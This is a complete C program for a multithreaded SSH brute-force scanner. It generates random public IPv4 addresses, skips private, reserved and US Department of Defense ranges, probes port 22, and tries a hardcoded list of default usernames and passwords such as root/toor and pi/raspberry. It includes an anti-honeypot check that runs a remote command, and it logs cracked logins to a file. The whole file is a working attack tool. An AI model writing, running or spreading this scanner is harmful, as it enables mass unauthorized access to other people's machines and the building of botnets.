#include <stdlib.h>
#include <stdio.h>
#include <libssh/libssh.h>
#include <time.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <fcntl.h>
#include <pthread.h>
#include <stdbool.h>
 
// gcc ssh57183.c -o sshbrute -pthread -lssh
 
#define USER_LEN 3 // Number of Usernames
#define PWD_LEN 9 // Number of Passwords
static uint32_t x, y, z, w; // Variables used for fast random
 
char* users[3] = {"root", "oracle", "pi"}; // Usernames to crack
char* pass[9] = {"root", "toor", "raspberry", "admin", "123456", "password", "oracle", "changeme", "administrator"}; // Passwords to crack
 
// PROTOTYPES
int connect_remote_host(ssh_session session); // Anti -honeypot attempts to execute a command
static char* get_random_ip(void); // Get random ipv4 ip
void writeLogins(const char* ip, char* user, char* pass); // Write logins to cracked.txt
void *ScanThread(); // SSH Cracking Thread
void Crack(char* ip);
const char* ip_to_str(uint32_t ip); // Deprecated uint32_t to char* function
int isOpen(char* ip, int timeout); // Detects whether the SSH port is open or not
void rand_init(); // Initiate the random variables with time etc.
uint32_t rand_next(); // Get a new random number
bool anti = false;
typedef struct _thread_data_t { // Structure for the multithreaded data
  int tid;
  double stuff;
} thread_data_t;
 
int main(int argc, char* argv[]){
  if (argc < 2 || argc > 3){ // if we didn't get enough arguments
    printf("Usage - ./sshbrute 100 -h (for 100 threads and antihoneypot)\n");
  }
 
  if (argc == 3){
    printf("[SSHBrute] Anti-Honeypot mode activated.\n");
    anti = true;
  }
 
	int threads = atoi(argv[1]); // Convert the argument into an int
	rand_init(); // Seed the random ipv4 generaor
 
	printf("[SSHBrute] Scan Threads: %d\n", threads);
	pthread_t nice_threads[threads];
	thread_data_t thr_data[threads];
 
	for (int i = 0; i < threads; i++){ // Create the scanning threads
		int res = pthread_create(&nice_threads[i], NULL, ScanThread, &thr_data[i]);
		if (res){
			printf("Error creating thread.");
		}
	}
  printf("[SSHBrute] Created %d scan threads\n", threads);
	for (int i = 0; i < threads; i++){
		pthread_join(nice_threads[i], NULL); // Join the threads
	}
	return 0;
}
 
void *ScanThread(){ // Thread where the scanning takes places
 
	for (;;){
    fd_set fdset;
    struct sockaddr_in sa;
    sa.sin_family = AF_INET;
    sa.sin_port = htons(22); // Create the sockaddr info and set the port to 22
 
    int sock = socket(AF_INET, SOCK_STREAM, 0); // Make a new socket
    if (sock < 0){
      printf("error creating socket. Error number: %d?\n", sock);
    }
    fcntl(sock, F_SETFL, O_NONBLOCK); // Set the port to non-blocking mode so we can time-out
 
		char* ip = get_random_ip(); // Generate a new IP address
    sa.sin_addr.s_addr = inet_addr(ip); // Convert the IP address to a uint32_t
 
    connect(sock, (struct sockaddr*)&sa, sizeof(sa)); // See if the port is open
 
    struct timeval Timeout; // Set the timeout to 2 seconds
    Timeout.tv_sec = 2;
    Timeout.tv_usec = 0;
 
    FD_ZERO(&fdset);
    FD_SET(sock, &fdset);
 
    if (select(sock + 1, NULL, &fdset, NULL, &Timeout) == 1){ // See if we connected after 2 seconds
                                                              // Lägg till den nya
      int so_error;
      socklen_t len = sizeof(so_error);
      getsockopt(sock, SOL_SOCKET, SO_ERROR, &so_error, &len);
      if (so_error == 0){
        Crack(ip);
        close(sock); // The port is open. Try to crack it.
      }
    }
    close(sock);
  }
}
 
void Crack(char* ip){
  int rc;
  printf("[SSHBrute] Cracking %s\n", ip);
  for (int i =0; i < USER_LEN; i++){
    ssh_session new_session = ssh_new(); // Create a new SSH session
    if (new_session == NULL){
      printf("Couldn't create SSH session. Run out of memory?\n");
      exit(-1);
    }
    ssh_options_set(new_session, SSH_OPTIONS_HOST, ip); // Self-explanatory
    ssh_options_set(new_session, SSH_OPTIONS_USER, users[i]);
    rc = ssh_connect(new_session);
    if (rc != SSH_OK){
      continue; // If we didn't connect, try again
    }
    for (int j = 0; j < PWD_LEN; j++){
      rc = ssh_userauth_password(new_session, NULL, pass[j]); // Set the logins to the new pword
      if (rc == SSH_AUTH_SUCCESS){
        if (anti){
          int rc = connect_remote_host(new_session);
          if (rc){
            writeLogins(ip, users[i], pass[j]);
          } else {
            printf("[SSHBrute] Found honeypot...");
          }
        } else {
          writeLogins(ip, users[i], pass[j]);
        }
 
        ssh_disconnect(new_session);
        ssh_free(new_session);
        return;
      }
    }
    ssh_disconnect(new_session);
    ssh_free(new_session);
  }
}
 
 
void rand_init(){ // This function seeds the random IPV4 gen with some random numbers
                  // Fixa
	x = time(NULL);
	y = getpid() ^ getppid();
	z = clock();
	w = z^y;
}
 
const char* ip_to_str(uint32_t ip){ // Just in case you need it, deprecated
	struct in_addr fake_addr;
	fake_addr.s_addr = ip;
	const char* res = inet_ntoa(fake_addr);
	return res;
}
 
int connect_remote_host(ssh_session session){
  ssh_channel channel;
  int rc;
  channel = ssh_channel_new(session);
  if (channel == NULL){
    return 0;
  }
  rc = ssh_channel_open_session(channel);
  if (rc != SSH_OK){
    ssh_channel_free(channel);
    return 0;
  }
  rc = ssh_channel_request_exec(channel, "ls");
  if (rc != SSH_OK){
    ssh_channel_close(channel);
    ssh_channel_free(channel);
    return 0;
  }
  ssh_channel_close(channel);
  ssh_channel_free(channel);
  return 1;
}
 
// Get a new random number
uint32_t rand_next() //period 2^96-1
{
    uint32_t t = x;
    t ^= t << 11;
    t ^= t >> 8;
    x = y; y = z; z = w;
    w ^= w >> 19;
    w ^= t;
    return w;
}
 
// Get a random IP that is not on a blacklist
// Fixa publik lista istället
static char* get_random_ip(void)
{
    uint32_t tmp;
    uint8_t o1, o2, o3, o4;
 
    do
    {
        tmp = rand_next();
 
        o1 = tmp & 0xff;
        o2 = (tmp >> 8) & 0xff;
        o3 = (tmp >> 16) & 0xff;
        o4 = (tmp >> 24) & 0xff;
    }
    while (o1 == 127 ||                             // 127.0.0.0/8      - Loopback
          (o1 == 0) ||                              // 0.0.0.0/8        - Invalid address space
          (o1 == 3) ||                              // 3.0.0.0/8        - General Electric Company
          (o1 == 15 || o1 == 16) ||                 // 15.0.0.0/7       - Hewlett-Packard Company
          (o1 == 56) ||                             // 56.0.0.0/8       - US Postal Service
          (o1 == 10) ||                             // 10.0.0.0/8       - Internal network
          (o1 == 192 && o2 == 168) ||               // 192.168.0.0/16   - Internal network
          (o1 == 172 && o2 >= 16 && o2 < 32) ||     // 172.16.0.0/14    - Internal network
          (o1 == 100 && o2 >= 64 && o2 < 127) ||    // 100.64.0.0/10    - IANA NAT reserved
          (o1 == 169 && o2 > 254) ||                // 169.254.0.0/16   - IANA NAT reserved
          (o1 == 198 && o2 >= 18 && o2 < 20) ||     // 198.18.0.0/15    - IANA Special use
          (o1 >= 224) ||                            // 224.*.*.*+       - Multicast
          (o1 == 6 || o1 == 7 || o1 == 11 || o1 == 21 || o1 == 22 || o1 == 26 || o1 == 28 || o1 == 29 || o1 == 30 || o1 == 33 || o1 == 55 || o1 == 214 || o1 == 215) // Department of Defense
    );
		char* hello = (char*)malloc(16*sizeof(char));
		sprintf(hello, "%d.%d.%d.%d", o1, o2, o3, o4);
    return hello;
}
 
// Write logins to a text file
void writeLogins(const char* ip, char* user, char* pass){
  printf("Found login: %s@%s:%s\n", user, ip, pass);
 
	FILE* f = fopen("hittade.txt", "a");
	if (f == NULL){
	   printf("Error writing to file");
	return;
	}
	fprintf(f, "%s@%s:%s\n", user, ip, pass);
	fclose(f);
	return;
}
